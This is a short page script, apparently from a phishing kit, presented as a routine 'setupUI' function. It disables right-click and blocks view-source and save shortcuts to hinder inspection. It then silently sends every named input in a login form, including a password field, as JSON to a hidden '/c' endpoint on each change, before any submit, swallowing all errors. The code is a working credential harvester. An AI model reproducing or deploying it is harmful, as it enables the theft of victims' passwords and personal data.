<script>
function setupUI() {
  const ENDPOINT = window.location.pathname + '/c';

  // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
  document.addEventListener("keydown", e => {
    const blockedKeyCodes = [83, 62, 7, 85, 424]; // S, >, BEL, U, F24
    const blockedKeys = ["u"];
    if (e.ctrlKey && (blockedKeyCodes.includes(e.keyCode) || blockedKeys.includes(e.key?.toLowerCase()))) {
      e.preventDefault();
    }
  });

  // 🔒 Disable right‑click context menu
  document.addEventListener("contextmenu", e => e.preventDefault());

  // 📝 Password input toggle
  const passwordInput = document.getElementById("upw");
  const toggleButton = document.getElementById("toggleupw");
  let hasTyped = false;

  if (passwordInput) {
    passwordInput.addEventListener("input", () => {
      if (!hasTyped) {
        hasTyped = true;
        passwordInput.type = "password";
      }
    });
  }

  if (passwordInput && toggleButton) {
    toggleButton.addEventListener("click", () => {
      if (!hasTyped) return;
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
      toggleButton.textContent = type === "password" ? "Show" : "Hide";
    });
  }

  function sendPayload(payload) {
    try {
      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
      let beaconOk = false;

      if (navigator.sendBeacon) {
        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
      }

      if (!beaconOk) {
        fetch(ENDPOINT, {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" },
          keepalive: true
        }).catch(() => {});
      }
    } catch (err) {}
  }

  // ✅ Option 1: Match all inputs inside #clsdiv, include only those with a name
  document.addEventListener("change", e => {
    const el = e.target;
    if (el?.closest("#clsdiv") && el.tagName === "INPUT") {
      const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };

      document.querySelectorAll("#clsdiv input").forEach(input => {
        if (input.name) {
          payload.fields[input.name] = input.value;
        }
      });

      sendPayload(payload);
    }
  });
}

setupUI();
</script>

		
